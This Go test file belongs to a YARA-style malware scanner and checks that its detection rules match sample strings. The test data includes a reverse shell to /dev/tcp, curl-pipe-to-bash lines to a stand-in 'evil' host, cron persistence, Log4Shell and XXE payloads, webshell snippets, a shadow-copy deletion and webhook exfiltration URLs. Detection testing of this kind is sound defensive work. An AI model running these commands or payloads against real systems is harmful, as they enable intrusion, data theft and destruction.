package artifactscan

import (
	"bytes"
	"encoding/binary"
	"testing"
)

// ruleMatches compiles a one-off rule with the given condition (and an optional
// strings section) and reports whether it fires against data.
func ruleMatches(t *testing.T, body, data string) bool {
	t.Helper()
	rules, errs := ParseRules("rule R {\n" + body + "\n}")
	if len(errs) != 0 || len(rules) != 1 {
		t.Fatalf("parse %q: errs=%v rules=%d", body, errs, len(rules))
	}
	return hasMatch((&Engine{rules: rules}).Scan([]byte(data)), "R")
}

func TestModuleFilesizeAndUint(t *testing.T) {
	// uint16(0) reads MZ little-endian (0x5A4D), filesize gates on size.
	data := "MZ" + string(make([]byte, 200))
	if !ruleMatches(t, "condition:\nuint16(0) == 0x5A4D and filesize > 100", data) {
		t.Error("uint16/filesize rule should match an MZ buffer > 100 bytes")
	}
	if ruleMatches(t, "condition:\nfilesize < 10", data) {
		t.Error("filesize < 10 should not match a 202-byte buffer")
	}
	// Big-endian + size suffix.
	if !ruleMatches(t, "condition:\nuint16be(0) == 0x4D5A and filesize < 1KB", data) {
		t.Error("uint16be / KB-suffix rule should match")
	}
	// Out-of-range read is undefined → no match (and no panic).
	if ruleMatches(t, "condition:\nuint32(100000) == 0", data) {
		t.Error("out-of-range uint32 should be undefined, not match")
	}
}

func TestModuleMathEntropy(t *testing.T) {
	high := make([]byte, 256)
	for i := range high {
		high[i] = byte(i) // uniform → entropy ~8
	}
	if !ruleMatches(t, "condition:\nmath.entropy(0, filesize) > 7", string(high)) {
		t.Error("uniform data should have entropy > 7")
	}
	low := string(bytes.Repeat([]byte{'A'}, 256)) // entropy 0
	if ruleMatches(t, "condition:\nmath.entropy(0, filesize) > 7", low) {
		t.Error("constant data should not exceed entropy 7")
	}
	if !ruleMatches(t, "condition:\nmath.in_range(filesize, 100, 1000)", low) {
		t.Error("math.in_range should bracket the file size")
	}
}

func TestModuleHash(t *testing.T) {
	data := "known artifact bytes"
	want := Analyze([]byte(data)).SHA256
	if !ruleMatches(t, "condition:\nhash.sha256(0, filesize) == \""+want+"\"", data) {
		t.Error("hash.sha256 over the whole file should equal the artifact sha256")
	}
	if ruleMatches(t, "condition:\nhash.sha256(0, filesize) == \"deadbeef\"", data) {
		t.Error("wrong hash should not match")
	}
}

func TestModuleELF(t *testing.T) {
	elfBytes := string(minimalELF64()) // e_type = ET_EXEC, 0 sections
	if !ruleMatches(t, "condition:\nelf.type == elf.ET_EXEC", elfBytes) {
		t.Error("elf.type should equal ET_EXEC")
	}
	if !ruleMatches(t, "condition:\nelf.number_of_sections == 0", elfBytes) {
		t.Error("minimal ELF has zero sections")
	}
	// pe.* on an ELF is undefined → never matches (no cross-format false positive).
	if ruleMatches(t, "condition:\npe.is_dll()", elfBytes) {
		t.Error("pe.is_dll() must be undefined (not match) on an ELF")
	}
}

func TestModulePE(t *testing.T) {
	peBytes := string(minimalPE32(true, 0x1000)) // DLL, entry RVA 0x1000 -> file off 0x400
	if !ruleMatches(t, "condition:\npe.is_dll() and pe.number_of_sections == 1", peBytes) {
		t.Error("crafted PE should be a 1-section DLL")
	}
	if !ruleMatches(t, "condition:\nuint16(0) == 0x5A4D and pe.entry_point == 0x400", peBytes) {
		t.Error("pe.entry_point should resolve to file offset 0x400")
	}
	// The byte at the entry-point file offset was seeded to 0xC3 (ret).
	if !ruleMatches(t, "condition:\nuint8(pe.entry_point) == 0xC3", peBytes) {
		t.Error("uint8(pe.entry_point) should read the seeded 0xC3")
	}
}

func TestNewBuiltinStringRules(t *testing.T) {
	e := NewEngine()
	cases := []struct {
		rule string
		data string
	}{
		{"XMRig_Miner", "config: stratum+tcp://pool.minexmr.com:4444 --donate-level 1"},
		{"XMRig_Miner", "loaded XMRig 6.0 randomx backend"},
		{"JSP_Webshell", `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`},
		{"ASPX_Webshell", `var p = new System.Diagnostics.Process(); p.Start(Request.QueryString["c"]);`},
		{"IoT_Botnet_Commands", "supports HTTPFLOOD and UDPFLOOD via /bin/busybox"},
		{"Linux_Cron_Persistence", "echo '@reboot curl http://evil/x | sh' | crontab -"},
		{"Sandbox_Evasion", "if(IsDebuggerPresent()) exit; detect VirtualBox guest"},
		{"CobaltStrike_Beacon", "ReflectiveLoader\x00beacon.x64.dll\x00"},
		{"Meterpreter_Payload", "metsrv\x00stdapi_sys_process\x00"},
	}
	for _, c := range cases {
		if !hasMatch(e.Scan([]byte(c.data)), c.rule) {
			t.Errorf("%s should match %q; got %v", c.rule, c.data, matchNames(e.Scan([]byte(c.data))))
		}
	}
	// A plainly benign string must trip none of them.
	if ms := e.Scan([]byte("the quick brown fox jumps over the lazy dog")); len(ms) != 0 {
		t.Errorf("benign text matched rules: %v", matchNames(ms))
	}
}

func TestMatchSeverity(t *testing.T) {
	cases := []struct {
		meta map[string]string
		want string
	}{
		{nil, "critical"},                 // default
		{map[string]string{}, "critical"}, // no severity meta
		{map[string]string{"severity": "medium"}, "medium"},
		{map[string]string{"severity": "INFO"}, "low"}, // synonym + case-fold
		{map[string]string{"severity": "crit"}, "critical"},
		{map[string]string{"severity": "bogus"}, "critical"}, // unknown -> default
		{map[string]string{"score": "80"}, "critical"},
		{map[string]string{"score": "60"}, "high"},
		{map[string]string{"score": "30"}, "medium"},
		{map[string]string{"score": "5"}, "low"},
		{map[string]string{"threat_score": "55"}, "high"},
	}
	for _, c := range cases {
		if got := MatchSeverity(Match{Meta: c.meta}); got != c.want {
			t.Errorf("MatchSeverity(%v) = %q, want %q", c.meta, got, c.want)
		}
	}
}

func TestBuiltinRuleSeverities(t *testing.T) {
	// The tagged trait/heuristic built-ins report their lowered severity; the
	// named-threat rules keep the critical default.
	want := map[string]string{
		"PE_Packed_UPX":             "medium",
		"Sandbox_Evasion":           "medium",
		"Credential_Theft":          "high",
		"XOR_Decoder_Stub":          "high",
		"PE_Dynamic_API_Resolution": "high",
		"XMRig_Miner":               "critical",
		"CobaltStrike_Beacon":       "critical",
		"Shell_Dropper":             "critical",
	}
	byName := map[string]Rule{}
	for _, r := range NewEngine().rules {
		byName[r.Name] = r
	}
	for name, sev := range want {
		r, ok := byName[name]
		if !ok {
			t.Errorf("built-in rule %q not found", name)
			continue
		}
		if got := MatchSeverity(Match{Meta: r.Meta}); got != sev {
			t.Errorf("rule %s severity = %q, want %q", name, got, sev)
		}
	}
}

func TestExpandedBuiltinRules(t *testing.T) {
	e := NewEngine()
	cases := []struct{ rule, data string }{
		{"TOOL_Mimikatz", "privilege::debug\nsekurlsa::logonpasswords full"},
		{"TOOL_LaZagne", "running lazagne all -oN"},
		{"TOOL_Chisel_Tunnel", "github.com/jpillora/chisel/server"},
		{"TOOL_Sliver_Implant", "registered sliverpb.Envelope handler"},
		{"MAL_AsyncRAT", "AsyncClient.exe connected"},
		{"MAL_njRAT", "njRAT v0.7d stub"},
		{"WEBSHELL_ChinaChopper", `<?php @eval($_POST['pass']);?>`},
		{"WEBSHELL_b374k", "b374k 3.2.3 php shell"},
		{"SCRIPT_PowerShell_Downloader", "$c=New-Object Net.WebClient; $c.DownloadString('http://x/a')"},
		{"SCRIPT_LOLBIN_Download", "certutil -urlcache -split -f http://evil/x.exe"},
		{"PACKER_VMProtect", "section .vmp0 .vmp1 added by VMProtect"},
		{"MINER_Generic_Stratum", "pool stratum+tcp://xmr.pool:4444"},
		{"LINUX_Diamorphine_Rootkit", "diamorphine module_hide give_root"},
	}
	for _, c := range cases {
		if !hasMatch(e.Scan([]byte(c.data)), c.rule) {
			t.Errorf("%s should match %q; got %v", c.rule, c.data, matchNames(e.Scan([]byte(c.data))))
		}
	}
	// Packer rules are severity=medium; malware/tool rules stay critical.
	rules := map[string]string{}
	for _, r := range e.rules {
		rules[r.Name] = MatchSeverity(Match{Meta: r.Meta})
	}
	if rules["PACKER_VMProtect"] != "medium" {
		t.Errorf("PACKER_VMProtect severity = %q, want medium", rules["PACKER_VMProtect"])
	}
	if rules["TOOL_Chisel_Tunnel"] != "high" {
		t.Errorf("TOOL_Chisel_Tunnel severity = %q, want high", rules["TOOL_Chisel_Tunnel"])
	}
	if rules["TOOL_Mimikatz"] != "critical" {
		t.Errorf("TOOL_Mimikatz severity = %q, want critical (default)", rules["TOOL_Mimikatz"])
	}
}

func TestExpandedBuiltinRulesV2(t *testing.T) {
	e := NewEngine()
	cases := []struct{ rule, data string }{
		{"RANSOM_LockBit", "drop note Restore-My-Files.txt and rename to .lockbit"},
		{"RANSOM_WannaCry", "@WanaDecryptor@.exe started, WANACRY! header"},
		{"RANSOM_Akira", "see akira_readme.txt for recovery"},
		{"MAL_Gh0stRAT", "magic Gh0stRAT controller"},
		{"MAL_Qakbot", "loader stage: Qakbot config block"},
		{"MAL_Vidar", "Vidar build sends screenshot.jpg and passwords.txt"},
		{"MAL_HTA_Dropper", `<hta:application/> var w=new ActiveXObject('WScript.Shell');`},
		{"WEBSHELL_reGeorg", "Georg says, 'All seems fine'"},
		{"TOOL_Impacket", "running impacket secretsdump.py"},
		{"TOOL_SQLMap", "scanned with sqlmap/1.7 (http://sqlmap.org)"},
		{"PERSIST_Schtasks", "schtasks /create /sc onlogon /tn x /ru system"},
		{"EVASION_Shadow_Copy_Delete", "cmd /c vssadmin delete shadows /all /quiet"},
		{"EXPLOIT_SSRF_Cloud_Metadata", "GET http://169.254.169.254/latest/meta-data/iam"},
		{"EXPLOIT_XXE", `<!ENTITY xxe SYSTEM "file:///etc/passwd">`},
		{"LINUX_Kinsing", "downloads kdevtmpfsi and kinsing"},
	}
	for _, c := range cases {
		if !hasMatch(e.Scan([]byte(c.data)), c.rule) {
			t.Errorf("%s should match %q; got %v", c.rule, c.data, matchNames(e.Scan([]byte(c.data))))
		}
	}
	sev := map[string]string{}
	for _, r := range e.rules {
		sev[r.Name] = MatchSeverity(Match{Meta: r.Meta})
	}
	for name, want := range map[string]string{
		"RANSOM_LockBit":     "critical", // family rules default critical
		"TOOL_Nmap":          "medium",   // recon tool tagged down
		"EXPLOIT_XSS_Script": "medium",
		"PERSIST_Schtasks":   "high",
	} {
		if sev[name] != want {
			t.Errorf("%s severity = %q, want %q", name, sev[name], want)
		}
	}
}

func TestExpandedBuiltinRulesV3(t *testing.T) {
	e := NewEngine()
	cases := []struct{ rule, data string }{
		{"APT_Sunburst", "assembly SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer"},
		{"APT_Stuxnet", "loads s7otbxdx.dll into the PLC"},
		{"LINUX_Mozi", "downloads /Mozi.m and Mozi.a"},
		{"LINUX_BPFDoor", "opens /dev/shm/kdmtmpflush bpfdoor"},
		{"MACOS_Atomic_Stealer", "this is the Atomic macOS Stealer build"},
		{"ANDROID_Cerberus", "package com.cerberus.banker"},
		{"EXFIL_Telegram_Bot", "POST https://api.telegram.org/bot123:ABC/sendMessage chat_id=42"},
		{"EXFIL_Discord_Webhook", "exfil to https://discord.com/api/webhooks/1/abc"},
		{"SCRIPT_Curl_Pipe_Shell", "curl http://evil/x.sh | bash"},
		{"SCRIPT_Bash_DevTcp_Shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
		{"EXPLOIT_Shellshock", "User-Agent: () { :;}; /bin/bash -c id"},
		{"EXPLOIT_Log4Shell_JNDI", "X-Api: ${jndi:ldap://evil/a}"},
		{"EXPLOIT_SSRF_Gopher_Dict", "url=gopher://127.0.0.1:6379/_set"},
		{"PACKER_ConfuserEx", "obfuscated with ConfuserEx v1.6"},
		{"TRAIT_Process_Hollowing", "NtUnmapViewOfSection then SetThreadContext"},
		{"TRAIT_UAC_Bypass", "hijack fodhelper.exe for elevation"},
		{"MAL_Ursnif", "Ursnif config c2 list"},
		{"MAL_Clipper", "calls SetClipboardData with bc1qxyz wallet"},
	}
	for _, c := range cases {
		if !hasMatch(e.Scan([]byte(c.data)), c.rule) {
			t.Errorf("%s should match %q; got %v", c.rule, c.data, matchNames(e.Scan([]byte(c.data))))
		}
	}
	// Benign text trips none of the new rules.
	if ms := e.Scan([]byte("a perfectly ordinary configuration file with no threats")); len(ms) != 0 {
		t.Errorf("benign text matched: %v", matchNames(ms))
	}
	sev := map[string]string{}
	for _, r := range e.rules {
		sev[r.Name] = MatchSeverity(Match{Meta: r.Meta})
	}
	for name, want := range map[string]string{
		"APT_Sunburst":         "critical",
		"PACKER_ConfuserEx":    "medium",
		"EXPLOIT_Shellshock":   "high",
		"TRAIT_AntiVM_Strings": "medium",
	} {
		if sev[name] != want {
			t.Errorf("%s severity = %q, want %q", name, sev[name], want)
		}
	}
}

func TestIoTOTBuiltinRules(t *testing.T) {
	e := NewEngine()
	cases := []struct{ rule, data string }{
		{"IOT_Hajime", "iot worm hajime atk.conf loaded"},
		{"IOT_Mukashi", "Mukashi bot targeting zyxel"},
		{"IOT_Enemybot", "EnemyBot ENEMScanner started"},
		{"IOT_MultiArch_Loader", "wget http://1.2.3.4/x; chmod 777 x; ./x; busybox"},
		{"IOT_Default_Cred_List", "creds: root xc3511 / root vizxv / admin admin1234"},
		{"IOT_GPON_Exploit", "POST /GponForm/diag_Form?images/ XWebPageName=diag"},
		{"OT_Modbus", "import pymodbus.client to talk to plc"},
		{"OT_BACnet", "using bacpypes WhoIsRequest on the building net"},
		{"OT_CODESYS", "exploit the CODESYS CmpApp runtime"},
		{"OT_PLCScan_Tool", "running plcscan against 10.0.0.0/24"},
		{"OT_Industroyer", "CrashOverride / Industroyer haslo.dat"},
		{"OT_Triton_Trisis", "deploy trilog.exe and imain.bin (TRISIS)"},
		{"OT_FrostyGoop", "FrostyGoop BUSTLEBERM modbus attack"},
		{"BAS_Tridium_Niagara", "Tridium Niagara Framework station.fox"},
		{"BAS_JohnsonControls_Metasys", "Johnson Controls Metasys supervisor"},
		{"OT_KNX", "KNXnet/IP tunneling to the building bus"},
		{"IIOT_SCADA_HMI_Products", "exfil from the WinCC and FactoryTalk servers"},
	}
	for _, c := range cases {
		if !hasMatch(e.Scan([]byte(c.data)), c.rule) {
			t.Errorf("%s should match %q; got %v", c.rule, c.data, matchNames(e.Scan([]byte(c.data))))
		}
	}
	sev := map[string]string{}
	for _, r := range e.rules {
		sev[r.Name] = MatchSeverity(Match{Meta: r.Meta})
	}
	for name, want := range map[string]string{
		"OT_Industroyer":      "critical", // ICS malware
		"IOT_Hajime":          "critical", // botnet family
		"OT_Modbus":           "medium",   // protocol reference tagged down
		"BAS_Tridium_Niagara": "medium",
		"OT_PLCScan_Tool":     "high", // recon tool
	} {
		if sev[name] != want {
			t.Errorf("%s severity = %q, want %q", name, sev[name], want)
		}
	}
}

func TestIoTOTBuiltinRulesV2(t *testing.T) {
	e := NewEngine()
	cases := []struct{ rule, data string }{
		{"IOT_AESDDoS", "AESDDoS aes.ddos bot v1"},
		{"IOT_Mirai_Owari", "Owari mirai variant loader"},
		{"IOT_MikroTik_Winbox", "exploit RouterOS via /nova/bin/user"},
		{"IOT_Netgear_SOAP", "POST /soap/server_sa/ SOAPAction: urn:NETGEAR"},
		{"OT_PCWorx", "talk PCWorx to the Phoenix Contact ILC"},
		{"OT_DLMS_COSEM", "DLMS COSEM smart meter read"},
		{"OT_Nmap_ICS_Scripts", "nmap --script s7-info,modbus-discover target"},
		{"OT_GreyEnergy", "GreyEnergy dropper stage 2"},
		{"OT_LockerGoga", "LockerGoga encrypted the SCADA workstation"},
		{"BAS_Siemens_APOGEE", "APOGEE Insight workstation"},
		{"BAS_Niagara_N4", "Niagara 4 station running"},
		{"AUTO_CANbus_Tools", "candump can0 | cansend can0 123#dead"},
		{"MED_DICOM", "magic DICM at offset 128, application/dicom"},
		{"MED_HL7", "MSH|^~\\&|SENDER|..."},
		{"IIOT_MQTT_SparkplugB", "topic spBv1.0/group/NBIRTH/edge"},
	}
	for _, c := range cases {
		if !hasMatch(e.Scan([]byte(c.data)), c.rule) {
			t.Errorf("%s should match %q; got %v", c.rule, c.data, matchNames(e.Scan([]byte(c.data))))
		}
	}
	sev := map[string]string{}
	for _, r := range e.rules {
		sev[r.Name] = MatchSeverity(Match{Meta: r.Meta})
	}
	for name, want := range map[string]string{
		"OT_GreyEnergy":       "critical", // ICS malware
		"IOT_AESDDoS":         "critical", // botnet family
		"OT_PCWorx":           "medium",   // protocol reference
		"BAS_Siemens_APOGEE":  "medium",
		"OT_Nmap_ICS_Scripts": "high", // recon
	} {
		if sev[name] != want {
			t.Errorf("%s severity = %q, want %q", name, sev[name], want)
		}
	}
}

func TestBuiltinModuleInjectionRule(t *testing.T) {
	// The injection triad is a PE-only rule: it must not fire on a non-PE that
	// merely mentions the API names as text (the module reads real imports).
	e := NewEngine()
	text := "VirtualAllocEx WriteProcessMemory CreateRemoteThread"
	if hasMatch(e.Scan([]byte(text)), "PE_Process_Injection_APIs") {
		t.Error("injection rule must key off real PE imports, not plain text")
	}
}

// minimalPE32 builds a tiny but debug/pe-parseable PE32 with one ".text"
// section. dll toggles IMAGE_FILE_DLL; entryRVA sets AddressOfEntryPoint. The
// byte at the entry point's file offset is seeded to 0xC3.
func minimalPE32(dll bool, entryRVA uint32) []byte {
	const peOff = 0x80
	buf := make([]byte, 0x600)
	copy(buf, "MZ")
	binary.LittleEndian.PutUint32(buf[0x3c:], peOff) // e_lfanew
	copy(buf[peOff:], "PE\x00\x00")

	fh := buf[peOff+4:]
	binary.LittleEndian.PutUint16(fh[0:], 0x014c) // Machine = i386
	binary.LittleEndian.PutUint16(fh[2:], 1)      // NumberOfSections
	binary.LittleEndian.PutUint16(fh[16:], 224)   // SizeOfOptionalHeader (PE32)
	chars := uint16(0x0102)                       // EXECUTABLE_IMAGE | 32BIT_MACHINE
	if dll {
		chars |= 0x2000 // IMAGE_FILE_DLL
	}
	binary.LittleEndian.PutUint16(fh[18:], chars)

	oh := buf[peOff+24:]                             // optional header
	binary.LittleEndian.PutUint16(oh[0:], 0x10b)     // Magic = PE32
	binary.LittleEndian.PutUint32(oh[16:], entryRVA) // AddressOfEntryPoint
	binary.LittleEndian.PutUint32(oh[92:], 16)       // NumberOfRvaAndSizes

	sec := buf[peOff+24+224:] // section header
	copy(sec[0:8], ".text")
	binary.LittleEndian.PutUint32(sec[8:], 0x100)   // VirtualSize
	binary.LittleEndian.PutUint32(sec[12:], 0x1000) // VirtualAddress
	binary.LittleEndian.PutUint32(sec[16:], 0x200)  // SizeOfRawData
	binary.LittleEndian.PutUint32(sec[20:], 0x400)  // PointerToRawData
	binary.LittleEndian.PutUint32(sec[36:], 0x60000020)

	buf[0x400] = 0xC3 // ret, at the entry point's file offset
	return buf
}
